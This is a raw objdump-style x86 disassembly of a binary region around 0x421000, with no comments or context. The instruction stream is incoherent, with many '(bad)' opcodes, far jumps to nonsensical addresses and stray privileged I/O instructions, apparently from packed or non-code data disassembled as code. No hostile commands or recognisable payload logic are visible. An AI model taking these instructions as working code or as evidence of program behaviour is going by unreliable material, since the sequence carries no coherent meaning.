  4211c8:	pop    ebx
  4211c9:	push   eax
  4211ca:	enter  0xfcaa,0xd1
  4211ce:	lods   al,BYTE PTR ds:[esi]
  4211cf:	mov    ch,0x32
  4211d1:	xlat   BYTE PTR ds:[ebx]
  4211d2:	inc    esi
  4211d3:	stos   DWORD PTR es:[edi],eax
  4211d4:	ins    DWORD PTR es:[edi],dx
  4211d5:	jae    0x42124e
  4211d7:	cmp    ebx,DWORD PTR [ebx+0x9]
  4211da:	call   0x5638:0x7a3615bc
  4211e1:	pushf  
  4211e2:	cmp    DWORD PTR [eax+ebx*2+0x1e268fed],ecx
  4211e9:	sbb    bh,0x13
  4211ec:	in     al,dx
  4211ed:	fld    QWORD PTR [ebp+ecx*4+0x6eb5a371]
  4211f4:	and    bh,dh
  4211f6:	mov    DWORD PTR [ebp+eax*1+0x6421571e],ecx
  4211fd:	sub    eax,esp
  4211ff:	sbb    ah,dl
  421201:	retf   0x998f
  421204:	loope  0x421234
  421206:	ret    
  421207:	fsubr  QWORD PTR [esi+0x5a]
  42120a:	push   es
  42120b:	mov    bh,0xd7
  42120d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42120e:	rol    BYTE PTR [ebx],cl
  421210:	(bad)  
  421211:	in     eax,dx
  421212:	inc    ebx
  421213:	or     DWORD PTR ds:0xbf58242,edi
  421219:	or     al,0x79
  42121b:	(bad)  
  42121c:	sbb    BYTE PTR [edi+0x49],al
  42121f:	dec    ebp
  421220:	push   edx
  421221:	ja     0x4211ef
  421223:	les    esi,FWORD PTR [edx]
  421225:	and    edi,edi
  421227:	(bad)  
  421228:	div    ah
  42122a:	add    al,0x15
  42122c:	jmp    0x3cc1fd8
  421231:	sbb    edi,DWORD PTR [esi-0x1]
  421234:	mov    ds:0x33657956,eax
  421239:	pop    edi
  42123a:	in     eax,0xa3
  42123c:	adc    BYTE PTR [ebx+0x4cec80a5],bh
	...
  4212b2:	add    BYTE PTR [eax],al
  4212b4:	inc    ecx
  4212b5:	push   es
  4212b6:	clc    
  4212b7:	mov    esi,0xff47feff
  4212bc:	or     eax,0xbf83dc15
  4212c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212c2:	jmp    0x42129e
  4212c4:	outs   dx,BYTE PTR ds:[esi]
  4212c5:	arpl   WORD PTR [ecx],ax
  4212c7:	add    dh,dh
  4212c9:	add    BYTE PTR [eax],al
  4212cb:	add    BYTE PTR [edi-0x6f9438fd],ch
  4212d1:	bound  ebp,QWORD PTR [ecx]
  4212d3:	pmaxsw mm2,QWORD PTR [edi]
  4212d6:	bnd jbe 0x42125a
  4212d9:	push   ss
  4212da:	jbe    0x4212dd
  4212dc:	mov    ds:0xfdc764d0,eax
  4212e1:	icebp  
  4212e2:	jge    0x4212f7
  4212e4:	ins    BYTE PTR es:[edi],dx
  4212e5:	ins    DWORD PTR es:[edi],dx
  4212e6:	adc    DWORD PTR [edi],ebx
  4212e8:	xor    DWORD PTR [ebp+0x25],0xffffffe0
  4212ec:	je     0x4212df
  4212ee:	jns    0x421332
  4212f0:	xor    ah,BYTE PTR [ecx]
  4212f2:	addr16 push edx
  4212f4:	stc    
  4212f5:	dec    edx
  4212f6:	mov    eax,ds:0x126b2a0d
  4212fb:	jg     0x4212af
  4212fd:	push   ebx
  4212fe:	shl    ecx,cl
  421300:	and    BYTE PTR [ebx],0x11
  421303:	xor    DWORD PTR [edi],eax
  421305:	xor    BYTE PTR [ebx-0x4e423058],dh
  42130b:	sbb    DWORD PTR [ebx],0xffffffbb
  42130e:	stos   DWORD PTR es:[edi],eax
  42130f:	push   ds
  421310:	pop    esi
  421311:	int3   
  421312:	(bad)  
  421313:	rol    BYTE PTR [ecx-0x68],1
  421316:	jo     0x4212e0
  421318:	mov    ss,WORD PTR [esi+edi*8]
  42131b:	mov    dl,0xd8
  42131d:	mov    esi,0xdb7d3cc8
  421322:	iret   
  421323:	push   es
  421324:	cld    
  421325:	push   ebx
  421326:	rcr    BYTE PTR [edx+edi*8],cl
  421329:	or     DWORD PTR [ecx],esp
  42132b:	outs   dx,BYTE PTR ds:[esi]
  42132c:	scas   al,BYTE PTR es:[edi]
  42132d:	xchg   esi,eax
  42132e:	les    edx,FWORD PTR [eax]
  421330:	aaa    
  421331:	call   DWORD PTR [ecx+0x49f5024]
  421337:	enter  0x6d6f,0xd
  42133b:	test   al,0xd2
  42133d:	popa   
  42133e:	push   0xccc61451
  421343:	scas   eax,DWORD PTR es:[edi]
  421344:	jbe    0x421345
  421346:	into   
  421347:	dec    edx
  421348:	cmc    
  421349:	push   eax
  42134a:	or     cl,0xfb
  42134d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42134e:	xchg   BYTE PTR [esi],al
  421350:	leave  
  421351:	add    ah,BYTE PTR [edi-0x77]
  421354:	in     eax,dx
  421355:	scas   al,BYTE PTR es:[edi]
  421356:	int3   
  421357:	pop    edi
  421359:	jnp    0x4212ff
  42135b:	test   BYTE PTR [ecx],dl
  42135d:	jecxz  0x4212f5
  42135f:	lea    edi,[edx]
  421361:	jns    0x4213cf
  421363:	scas   eax,DWORD PTR es:[edi]
  421364:	enter  0xa506,0x2
  421368:	mov    cl,0x26
  42136a:	sbb    ecx,eax
  42136c:	push   ecx
  42136d:	call   0x69a16f86
  421372:	das    
  421373:	cdq    
  421374:	xchg   dl,ch
  421376:	push   esp
  421377:	mov    edx,0xe400fccc
  42137c:	jp     0x42135f
  42137e:	test   bh,bl
  421380:	mov    dl,0x1c
  421382:	dec    ecx
  421383:	jne    0x42134d
  421385:	push   0x37
  421387:	xor    ah,BYTE PTR [eax]
  421389:	jmp    0x130c:0x64186537
  421390:	fwait
  421391:	add    BYTE PTR [esi+edx*2-0x15],cl
  421395:	adc    eax,0xee0ccfe4
  42139a:	cmp    ecx,0x1b
  42139d:	dec    ebp
  42139e:	adc    al,BYTE PTR [ebp-0x1c]
  4213a1:	je     0x42139b
  4213a3:	sbb    BYTE PTR [ebx],dh
  4213a5:	in     eax,dx
  4213a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213a7:	or     edi,esp
  4213a9:	jae    0x421335
  4213ab:	mov    bh,0x92
  4213ad:	loopne 0x42142b
  4213af:	push   ebx
  4213b0:	adc    bl,BYTE PTR [ecx+0x2f6f27ca]
  4213b6:	fstp   QWORD PTR [eiz*8-0x18ac010d]
  4213bd:	adc    al,ah
  4213bf:	mov    dh,al
  4213c1:	in     al,0x0
	...
  421433:	add    BYTE PTR [esi+0x7f125794],ch
  421439:	shr    edi,cl
  42143b:	mov    esp,0x960320e2
  421440:	nop
  421441:	shr    DWORD PTR [edx+eax*1+0x64],1
  421445:	add    DWORD PTR fs:[eax],eax
  421448:	test   BYTE PTR [eax],0x0
  42144b:	add    dl,ah
  42144d:	cdq    
  42144e:	or     bl,bh
  421450:	out    dx,al
  421451:	test   BYTE PTR [edx],ch
  421453:	iret   
  421454:	lods   eax,DWORD PTR ds:[esi]
  421455:	jp     0x42148c
  421457:	xor    ebx,DWORD PTR [eax]
  421459:	sbb    edi,esi
  42145b:	int3   
  42145c:	adc    DWORD PTR ds:[edx+0x6a],0x70
  421461:	cmp    eax,0xcede7c91
  421466:	cmp    eax,DWORD PTR [ebp+0x3f]
  421469:	ja     0x4214b4
  42146b:	mov    edx,DWORD PTR cs:[ecx]
  42146e:	hlt    
  42146f:	xlat   BYTE PTR ds:[ebx]
  421470:	mov    edx,0x40d670c6
  421475:	jbe    0x42143f
  421477:	dec    ebp
  421478:	loop   0x421490
  42147a:	int3   
  42147b:	out    dx,al
  42147c:	adc    al,0xa8
  42147e:	mov    ds:0x89624cd7,al
  421483:	fisttp WORD PTR [edx+0x5b1c2bcd]
  421489:	in     eax,dx
  42148a:	mov    cl,0xfc
  42148c:	std    
  42148d:	sbb    eax,0x3b2fdee1
  421492:	mov    ecx,0x9fc7ad0a
  421497:	shr    DWORD PTR [esi+edx*8+0x89c8099],1
  42149e:	push   ebx
  42149f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214a0:	pop    eax
  4214a1:	mov    ah,0x4f
  4214a3:	xchg   esi,eax
  4214a4:	mov    DWORD PTR [ebx+0x15],eax
  4214a7:	sbb    ebx,DWORD PTR [esi-0x59b86280]
  4214ad:	retf   0xbf58
  4214b0:	mov    ecx,0x2ecfcdf5
  4214b5:	stos   DWORD PTR es:[edi],eax
  4214b6:	stos   BYTE PTR es:[edi],al
  4214b7:	(bad)  
  4214b8:	mov    esi,0xd690e543
  4214bd:	ins    BYTE PTR es:[edi],dx
  4214be:	jge    0x4214d2
  4214c0:	shl    DWORD PTR [eax+0x60c38d1e],cl
  4214c6:	mov    bl,0x69
  4214c8:	cmp    ah,BYTE PTR ds:0x7f851110
  4214ce:	arpl   WORD PTR ds:0x973b7acc,sp
  4214d4:	fistp  WORD PTR [ecx-0x2b067755]
  4214da:	rcr    DWORD PTR [ebp-0x58b0c071],1
  4214e0:	loop   0x42152c
  4214e2:	jle    0x421533
  4214e4:	sbb    al,0x91
  4214e6:	fcomip st,st(3)
  4214e8:	mov    edx,0x813dfa79
  4214ed:	(bad)  
  4214ee:	push   edi
  4214ef:	xchg   edi,eax
  4214f0:	jg     0x4214db
  4214f2:	test   al,0x46
  4214f4:	sbb    DWORD PTR [edx+0x6599f1b4],0x8bc03013
  4214fe:	je     0x421577
  421500:	outs   dx,BYTE PTR ds:[esi]
  421501:	mov    al,0x9e
  421503:	sbb    al,0x9e
  421505:	pop    ss
  421506:	and    ecx,DWORD PTR [eax+0x5d0e6e2f]
  42150c:	int    0x56
  42150e:	add    BYTE PTR [ebx-0x4a],bl
  421511:	cmp    ebx,eax
  421513:	fisttp QWORD PTR [edx+0x15f66568]
  421519:	jo     0x42158c
  42151b:	fcom   DWORD PTR [esi]
  42151d:	and    BYTE PTR [esi+0x284dd95d],cl
  421523:	lahf   
  421524:	pop    es
  421525:	ret    0x880
  421528:	add    al,0x6
  42152a:	pop    ss
  42152b:	cmp    al,0x37
  42152d:	sub    eax,0xc398571d
  421532:	jl     0x4214b9
  421534:	sub    esp,edx
  421536:	xlat   BYTE PTR ds:[ebx]
  421537:	stos   BYTE PTR es:[edi],al
  421538:	arpl   dx,si
  42153a:	adc    ebp,DWORD PTR [ebx]
  42153c:	and    BYTE PTR [eax+ebx*4+0x4b02c9],dl
	...
  4215b3:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  4215ba:	mov    ah,0xec
  4215bc:	int3   
  4215bd:	ror    BYTE PTR [edx+ebp*4],cl
  4215c0:	daa    
  4215c1:	cwde   
  4215c2:	call   0x1a76fea
  4215c7:	add    dh,dh
  4215c9:	add    BYTE PTR [eax],al
  4215cb:	add    BYTE PTR [ebx-0x3fcd564b],cl
  4215d1:	mov    WORD PTR [edx],es
  4215d3:	push   ebp
  4215d4:	xchg   edi,eax
  4215d5:	pop    ss
  4215d6:	lea    ecx,[ebx+ebp*2+0x1125f7dc]
  4215dd:	mov    ebp,0x27eefca8
  4215e2:	int    0x1a
  4215e4:	mov    esi,0x9499ce9a
  4215e9:	mov    edi,DWORD PTR [edi+0x1878f3a7]
  4215ef:	sbb    al,0xf3
  4215f1:	pop    eax
  4215f2:	loope  0x4215ad
  4215f4:	rcr    BYTE PTR [esi+0x620f707c],1
  4215fa:	mov    DWORD PTR [ebx],edi
  4215fc:	and    al,0x0
  4215fe:	dec    ebx
  4215ff:	out    0x16,al
  421601:	das    
  421602:	mov    ebx,0x4dc454b2
  421607:	pop    ds
  421608:	fabs   
  42160b:	retf   
  42160c:	add    edx,eax
  42160e:	loopne 0x421620
  421610:	dec    edi
  421611:	(bad)  
  421612:	ins    BYTE PTR es:[edi],dx
  421613:	retf   
  421614:	shr    DWORD PTR ds:0xe9694691,1
  42161a:	stc    
  42161b:	xchg   ecx,eax
  42161c:	sub    BYTE PTR [edi+0x3878846],bh
  421622:	mov    DWORD PTR [edi],eax
  421624:	pop    edi
  421625:	cmp    eax,0xc908e6ad
  42162a:	xor    edi,DWORD PTR [edi+0x4f]
  42162d:	(bad)  
  42162e:	in     al,dx
  42162f:	pop    ss
  421630:	test   eax,0x1fed6c4b
  421635:	shl    DWORD PTR [edx],cl
  421637:	shl    dh,1
  421639:	loope  0x42164c
  42163b:	mov    eax,ds:0x7ec934cc
  421640:	pop    ebp
  421641:	dec    ebx
  421642:	push   esp
  421643:	inc    eax
  421644:	xchg   BYTE PTR [edi-0x18],bh
  421647:	sub    DWORD PTR [ebp+0x1d],edx
  42164a:	mov    WORD PTR [edi+0x8],cs
  42164d:	or     esp,ebx
  42164f:	jmp    0xd0f6:0x8ef34fb
  421656:	push   ss
  421657:	or     DWORD PTR [ecx],ebx
  421659:	aam    0xe0
  42165b:	bound  ebx,QWORD PTR ss:0x393ede7a
  421662:	mov    bh,0x49
  421664:	call   0xda7e14f7
  421669:	stos   BYTE PTR es:[edi],al
  42166a:	and    BYTE PTR [esi+0x50eaba79],ah
  421670:	sar    BYTE PTR [ecx+esi*8+0x69],cl
  421674:	mov    dl,0x23
  421676:	xchg   ebp,eax
  421677:	xchg   BYTE PTR [edi+edi*8],ah
  42167a:	(bad)  
  42167c:	jne    0x4216ea
  42167e:	aas    
  42167f:	arpl   WORD PTR [ebp+eiz*4+0x74],ax
  421683:	pop    ss
  421684:	inc    ebx
  421685:	fsubrp st(6),st
  421687:	aas    
  421688:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421689:	sub    ebx,edi
  42168b:	into   
  42168c:	xor    eax,0xa9b6c063
  421691:	push   esi
  421692:	push   edx
  421693:	xlat   BYTE PTR ds:[ebx]
  421694:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421695:	cmc    
  421696:	sub    DWORD PTR [esi+edx*2-0x19],0xda28e813
  42169e:	xchg   esi,eax
  42169f:	popa   
  4216a0:	adc    edx,edx
  4216a2:	jne    0x42166d
  4216a4:	in     al,0x92
  4216a6:	ins    DWORD PTR es:[edi],dx
  4216a7:	outs   dx,BYTE PTR ds:[esi]
  4216a8:	lock mov ds:0x80d3a20d,eax
  4216ae:	xchg   edx,eax
  4216af:	ds inc edi
  4216b1:	pusha  
  4216b2:	push   cs
  4216b3:	ss inc eax
  4216b5:	or     DWORD PTR [eax+0x14209500],esp
  4216bb:	lock add cl,BYTE PTR [ebp-0x16ad0ee4]
	...
  421732:	add    BYTE PTR [eax],al
  421734:	mov    DWORD PTR [edi],ebp
  421736:	and    eax,0xad8aa780
  42173b:	das    
  42173c:	retf   0x8184
  42173f:	cmp    edx,DWORD PTR [edi+edx*4+0x6650744f]
  421746:	add    DWORD PTR [eax],eax
  421748:	test   BYTE PTR [eax],0x0
  42174b:	add    BYTE PTR [eax-0x3e],ah
  42174e:	jno    0x421763
  421750:	sub    BYTE PTR [esi+0x3c],al
  421753:	call   0xaa6d:0xd741358a
  42175a:	nop
  42175b:	inc    edx
  42175c:	or     eax,0xded40561
  421761:	and    DWORD PTR [edx+0x5b482307],ebp
  421767:	sbb    ebx,edx
  421769:	jb     0x42175a
  42176b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42176c:	rol    BYTE PTR [edi-0x72c204cf],1
  421772:	push   edi
  421773:	sub    eax,0x65e9e110
  421778:	pop    es
  421779:	pushf  
  42177a:	(bad)  
  42177c:	jp     0x4217d2
  42177e:	imul   esi,eax,0xfffffff9
  421781:	ins    DWORD PTR es:[edi],dx
  421782:	lock gs jo 0x42170d
  421786:	or     DWORD PTR [ebp+0x21],edx
  421789:	jmp    0x3857:0xa26d76b3
  421790:	imul   edi,DWORD PTR [eax],0x64
  421793:	or     BYTE PTR [ebp+0x106ad409],dl
  421799:	xor    bh,BYTE PTR [edx+eax*8]
  42179c:	jecxz  0x42174d
  42179e:	inc    ebx
  42179f:	pop    edi
  4217a0:	pop    ss
  4217a1:	in     eax,0x4d
  4217a3:	xor    al,0xc6
  4217a5:	cwde   
  4217a6:	dec    edi
  4217a7:	mov    edi,0xfbdcf342
  4217ac:	int    0xcd
  4217ae:	cld    
  4217af:	dec    esi
  4217b0:	push   ds
  4217b1:	ret    
  4217b2:	cdq    
  4217b3:	and    esp,DWORD PTR [eax]
  4217b5:	fcomp  st(3)
  4217b7:	pop    edi
  4217b8:	lods   eax,DWORD PTR ds:[esi]
  4217b9:	cmc    
  4217ba:	rcr    BYTE PTR [ebp+0x693dcabd],cl
  4217c0:	outs   dx,DWORD PTR ds:[esi]
  4217c1:	js     0x4217c4
  4217c3:	out    0xd5,al
  4217c5:	adc    dh,BYTE PTR [ebp+0x14]
  4217c8:	adc    BYTE PTR [esi+0x38],ch
  4217cb:	inc    esi
  4217cc:	adc    bh,BYTE PTR [ebx]
  4217ce:	or     BYTE PTR [edi+0xe46f965],dl
  4217d4:	leave  
  4217d5:	into   
  4217d6:	push   ss
  4217d7:	pop    edi
  4217d8:	test   eax,0x3f493041
  4217dd:	loop   0x4217b2
  4217df:	mov    ch,0x6a
  4217e1:	xchg   edi,eax
  4217e2:	es popa 
  4217e4:	daa    
  4217e5:	sbb    BYTE PTR [eax],ch
  4217e7:	adc    dl,bh
  4217e9:	dec    eax
  4217ea:	(bad)  
  4217eb:	pop    edi
  4217ec:	jb     0x4217dc
  4217ee:	loopne 0x421798
  4217f0:	jmp    0xd8da:0x56b3cd86
  4217f7:	add    al,0x69
  4217f9:	dec    ecx
  4217fa:	xchg   BYTE PTR [edi+eax*4-0x4a6aad06],cl
  421801:	in     eax,dx
  421802:	repz lock ja 0x421826
  421806:	add    DWORD PTR ds:0xc308763b,ecx
  42180c:	popf   
  42180d:	arpl   WORD PTR [eax-0x5dd3acd5],cx
  421813:	leave  
  421814:	popa   
  421815:	sub    al,0x19
  421817:	adc    DWORD PTR [edx-0x3f18f0dc],edx
  42181d:	das    
  42181e:	(bad)  
  42181f:	outs   dx,BYTE PTR ds:[esi]
  421820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421821:	out    dx,al
  421822:	lock cdq 
  421824:	cli    
  421825:	data16 ror BYTE PTR [eax*1-0x644b630f],1
  42182d:	mov    dh,0xfd
  42182f:	mov    WORD PTR [ebp+ebx*2-0x5d92670d],ss
  421836:	iret   
  421837:	pop    ds
  421838:	sub    edi,0x98d6923e
  42183e:	sub    BYTE PTR [esi],bl
  421840:	inc    eax
  421841:	push   edi
	...
  4218b2:	add    BYTE PTR [eax],al
  4218b4:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4218bb:	mov    ch,0x82
  4218bd:	lods   eax,DWORD PTR ds:[esi]
  4218be:	push   ds
  4218bf:	adc    ecx,DWORD PTR [eax+0x461cfcb0]
  4218c5:	add    DWORD PTR [bx+si],eax
  4218c8:	test   BYTE PTR [eax],0x0
  4218cb:	add    dl,bh
  4218cd:	sbb    eax,DWORD PTR [edi]
  4218cf:	paddusb mm0,QWORD PTR [eax+0x602cdf36]
  4218d6:	jmp    0x214b:0xa12ea980
  4218dd:	stc    
  4218de:	dec    ebx
  4218df:	(bad)  
  4218e0:	push   ebx
  4218e1:	pop    es
  4218e2:	inc    ebp
  4218e3:	xchg   ebp,eax
  4218e4:	pop    ebx
  4218e5:	mov    bl,0xb5
  4218e7:	sub    BYTE PTR [ebx+0x22],al
  4218ea:	jne    0x4218f4
  4218ec:	jmp    0xd294:0x17c5a9e7
  4218f3:	xchg   esp,eax
  4218f4:	xor    dh,BYTE PTR [eax-0x1e0589f3]
  4218fa:	(bad)  
  4218fb:	pusha  
  4218fc:	clc    
  4218fd:	cli    
  4218fe:	hlt    
  4218ff:	retf   
  421900:	push   edi
  421901:	add    al,0x60
  421903:	sbb    eax,0x4a0ddc55
  421908:	sti    
  421909:	or     BYTE PTR [edx],bl
  42190b:	sbb    BYTE PTR [eax],dh
  42190d:	sbb    al,BYTE PTR [edi-0x70]
  421910:	jns    0x42191e
  421912:	jmp    0xb70a:0x6e8ec3b8
  421919:	mov    ch,0x22
  42191b:	cdq    
  42191c:	outs   dx,BYTE PTR ds:[esi]
  42191d:	(bad)  
  42191f:	les    edi,FWORD PTR [edi-0x28]
  421922:	jns    0x4218bc
  421924:	dec    edi
  421925:	rol    BYTE PTR [ebp+0x72],0xd8
  421929:	dec    ebx
  42192a:	call   0x218b3f83
  42192f:	dec    esi
  421930:	jle    0x42194e
  421932:	scas   al,BYTE PTR es:[edi]
  421933:	lahf   
  421934:	call   0xc619:0xe8ff0d80
  42193b:	call   0xc3ad:0xe4367ddb
  421942:	push   DWORD PTR [ebx]
  421944:	fwait
  421945:	stos   DWORD PTR es:[edi],eax
  421946:	mov    al,0x78
  421948:	repnz jecxz 0x42193d
  42194b:	mov    cl,0xb0
  42194d:	jns    0x421977
  42194f:	pop    ds
  421950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421951:	xchg   ebx,eax
  421952:	inc    ebp
  421953:	mov    dl,0xb9
  421955:	add    al,0x42
  421957:	dec    ecx
  421958:	aaa    
  421959:	rol    BYTE PTR ds:0x46a98a59,cl
  42195f:	add    ecx,DWORD PTR [ecx+esi*4+0x5664b423]
  421966:	dec    eax
  421967:	popa   
  421968:	xor    al,0x89
  42196a:	loop   0x42197d
  42196c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42196d:	fcmovb st,st(3)
  42196f:	mov    ds:0x4ff1a8ce,eax
  421974:	xchg   esp,eax
  421975:	jno    0x4219b1
  421977:	mov    ebp,0x6c729b4b
  42197c:	dec    esp
  42197d:	test   al,0xc2
  42197f:	cwde   
  421980:	jns    0x421982
  421982:	ds xchg ecx,eax
  421984:	rcr    DWORD PTR [edx],cl
  421986:	xor    eax,0x4d36242f
  42198b:	jns    0x4219a1
  42198d:	into   
  42198e:	mov    ds:0x3d6cb82e,eax
  421993:	(bad)  
  421994:	jae    0x42194f
  421996:	les    ecx,FWORD PTR [ebx+0x9]
  421999:	icebp  
  42199a:	shr    DWORD PTR [esi-0x69],1
  42199d:	xchg   ecx,eax
  42199e:	mov    ds:0x7361c0a,eax
  4219a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219a4:	and    dh,BYTE PTR [ecx]
  4219a6:	jae    0x4219e9
  4219a8:	out    dx,al
  4219a9:	jecxz  0x421a13
  4219ab:	imul   esi,DWORD PTR [edi+0xa],0xb093a36b
  4219b2:	xor    eax,0x92dbcdc0
  4219b7:	jge    0x4219a3
  4219b9:	mov    al,ds:0x8c6beead
  4219be:	jle    0x4219ff
  4219c0:	and    DWORD PTR [ecx],esp
	...
  421a32:	add    BYTE PTR [eax],al
  421a34:	fbstp  TBYTE PTR [edx]
  421a36:	scas   eax,DWORD PTR es:[edi]
  421a37:	adc    ebp,edi
  421a39:	lahf   
  421a3a:	(bad)  
  421a3b:	(bad)  
  421a3c:	mov    al,0x37
  421a3e:	and    edx,DWORD PTR [edx-0x2639cfb2]
  421a44:	cmp    al,0x68
  421a46:	add    DWORD PTR [eax],eax
  421a48:	test   BYTE PTR [eax],0x0
  421a4b:	add    BYTE PTR [edi-0x3],dl
  421a4e:	inc    eax
  421a4f:	gs xchg edi,eax
  421a51:	dec    edx
  421a52:	(bad)
  421a55:	jae    0x421aa3
  421a57:	push   0x41
  421a59:	mov    dh,0xcb
  421a5b:	mov    edx,edx
  421a5d:	add    DWORD PTR [esi+0x7c],eax
  421a60:	aas    
  421a61:	in     al,0xfe
  421a63:	inc    ecx
  421a64:	in     eax,0xff
  421a66:	xchg   edi,eax
  421a67:	xor    al,0xa8
  421a69:	pop    ebx
  421a6a:	xchg   ch,dh
  421a6c:	cdq    
  421a6d:	bound  esi,QWORD PTR [ebp+0x625bbe7e]
  421a73:	lods   eax,DWORD PTR ds:[esi]
  421a74:	rol    DWORD PTR [ebp-0x2800da03],0xd1
  421a7b:	retf   0xe72e
  421a7e:	add    dh,BYTE PTR [eax+0x50da5b69]
  421a84:	push   0x8eee0b7
  421a89:	mov    ch,0xa4
  421a8b:	mov    ds:0x266e8c87,al
  421a90:	ror    BYTE PTR [esi],0xfc
  421a93:	inc    esi
  421a94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a95:	pop    es
  421a96:	dec    esp
  421a97:	call   0x103c8812
  421a9c:	push   ss
  421a9d:	xchg   ebp,eax
  421a9e:	std    
  421a9f:	gs fwait
  421aa1:	push   es
  421aa2:	mov    ecx,DWORD PTR [edi-0x4f2c5ee4]
  421aa8:	xchg   esp,eax
  421aa9:	stc    
  421aaa:	xor    DWORD PTR [edi],edx
  421aac:	mov    eax,0xac24ed0
  421ab1:	cld    
  421ab2:	lods   eax,DWORD PTR ds:[esi]
  421ab3:	pop    edi
  421ab4:	mov    BYTE PTR [esi],dl
  421ab6:	(bad)  
  421ab7:	pop    ds
  421ab8:	adc    DWORD PTR [edi-0x49],ebx
  421abb:	xor    DWORD PTR [ebx+0x7b],eax
  421abe:	cdq    
  421abf:	adc    dl,ch
  421ac1:	dec    esp
  421ac2:	lods   eax,DWORD PTR ds:[esi]
  421ac3:	jmp    0xb184:0xa5f95cd3
  421aca:	mov    al,ds:0xc0faa06f
  421acf:	mov    bh,0xf2
  421ad1:	(bad)  
  421ad2:	loopne 0x421afc
  421ad4:	mov    ds:0x55fe97f7,al
  421ad9:	jmp    0x3fe6ca91
  421ade:	or     dh,BYTE PTR ds:0xb87db292
  421ae4:	mov    edx,DWORD PTR [edi]
  421ae6:	frstor [ebp-0x742ca875]
  421aec:	and    ecx,edi
  421aee:	fist   WORD PTR [edi-0x6ee87973]
  421af4:	jmp    0x4522:0x98196675
  421afb:	dec    edi
  421afc:	sub    ch,BYTE PTR [edx]
  421afe:	loopne 0x421b44
  421b00:	js     0x421aeb
  421b02:	in     eax,0x8b
  421b04:	xor    BYTE PTR [esi],al
  421b06:	sbb    BYTE PTR [eax-0x60229ae0],al
  421b0c:	jmp    0x421ae4
  421b0e:	xor    bh,BYTE PTR [eax+0x2e]
  421b11:	jl     0x421b26
  421b13:	iret   
  421b14:	dec    ebx
  421b15:	xor    al,0x1e
  421b17:	cmp    al,0x37
  421b19:	das    
  421b1a:	pop    edx
  421b1b:	div    esp
  421b1d:	test   eax,0x72b1af84
  421b22:	test   esp,0x9b680783
  421b28:	pop    ebp
  421b29:	mov    ecx,0x2b1021fd
  421b2e:	push   eax
  421b2f:	out    dx,al
  421b30:	bound  edi,QWORD PTR [esp+ecx*2]
  421b33:	sub    DWORD PTR [ebx+eax*2-0x5b],ecx
  421b37:	arpl   WORD PTR [esi+0x106192e],cx
  421b3d:	inc    edi
  421b3e:	jo     0x421b22
  421b40:	call   DWORD PTR [edx]
	...
  421bb2:	add    BYTE PTR [eax],al
  421bb4:	mov    dl,BYTE PTR ds:0xbf9fb10b
  421bba:	mov    edx,0xae2d6a3f
  421bbf:	sub    esp,edi
  421bc1:	ret    0xa1d5
  421bc4:	xor    ch,BYTE PTR [ecx+0x1]
  421bc7:	add    dh,dh
  421bc9:	add    BYTE PTR [eax],al
  421bcb:	add    BYTE PTR [eax-0x40],dh
  421bce:	scas   eax,DWORD PTR es:[edi]
  421bcf:	mov    ds:0xb94feb2f,eax
  421bd4:	leave  
  421bd5:	sahf   
  421bd6:	mov    ecx,DWORD PTR [edi]
  421bd8:	cmp    cl,BYTE PTR [ecx-0x3760738d]
  421bde:	add    edx,DWORD PTR [ebx]
  421be0:	outs   dx,BYTE PTR ds:[esi]
  421be1:	mov    ebx,0x7d69b6f3
  421be6:	stc    
  421be7:	inc    ebp
  421be8:	dec    ebp
  421be9:	int    0x97
  421beb:	mov    ds:0x9e42f458,eax
  421bf0:	sbb    al,BYTE PTR [eax]
  421bf2:	sub    ebp,edi
  421bf4:	and    BYTE PTR [edx+0x60],al
  421bf7:	adc    DWORD PTR [esi],esp
  421bf9:	hlt    
  421bfa:	ret    
  421bfb:	dec    ebx
  421bfc:	stos   BYTE PTR es:[edi],al
  421bfd:	mov    ecx,0x9c756e61
  421c02:	push   esp
  421c03:	mov    eax,0x65f10a9
  421c08:	lods   eax,DWORD PTR ds:[esi]
  421c09:	adc    DWORD PTR [edx+0x3c],ecx
  421c0c:	add    dh,BYTE PTR gs:[edx+eax*1]
  421c10:	dec    edx
  421c11:	imul   ebx,DWORD PTR [edi+0x2c591651],0x3f
  421c18:	stc    
  421c19:	mov    edx,0x500873cb
  421c1e:	scas   eax,DWORD PTR es:[edi]
  421c1f:	cmp    al,BYTE PTR [eax+eiz*8+0x648348da]
  421c26:	xchg   ecx,eax
  421c27:	cmp    eax,0xc3eff4d1
  421c2c:	retf   
  421c2d:	cli    
  421c2e:	xchg   bh,dh
  421c30:	(bad)  
  421c31:	pop    ebp
  421c32:	push   esp
  421c33:	dec    ebp
  421c34:	lds    ebx,FWORD PTR [esp+ebx*2-0x4b0d921b]
  421c3b:	fcomp  DWORD PTR [ebx+edi*1]
  421c3e:	or     edi,ecx
  421c40:	lods   al,BYTE PTR ds:[esi]
  421c41:	mov    esp,0xf969e137
  421c46:	cs loop 0x421c12
  421c49:	xor    ecx,DWORD PTR [ebx-0x54]
  421c4c:	sub    DWORD PTR [esp+ebp*1+0x46d9e953],ebp
  421c53:	or     eax,0xbc5816a6
  421c58:	mov    dh,0x52
  421c5a:	ret    0x689d
  421c5d:	xchg   ecx,eax
  421c5e:	push   cs
  421c5f:	test   BYTE PTR [edi+0x216eea8c],0xbc
  421c66:	pop    ecx
  421c67:	pop    edx
  421c68:	pop    edi
  421c69:	pop    ebx
  421c6a:	jmp    0xa2:0xe6e88838
  421c71:	and    DWORD PTR [ecx-0x1c3e5427],edi
  421c77:	fidiv  DWORD PTR [ebx-0x50]
  421c7a:	cwde   
  421c7b:	mov    ecx,DWORD PTR [edi]
  421c7d:	xor    DWORD PTR [esi+eax*1],esi
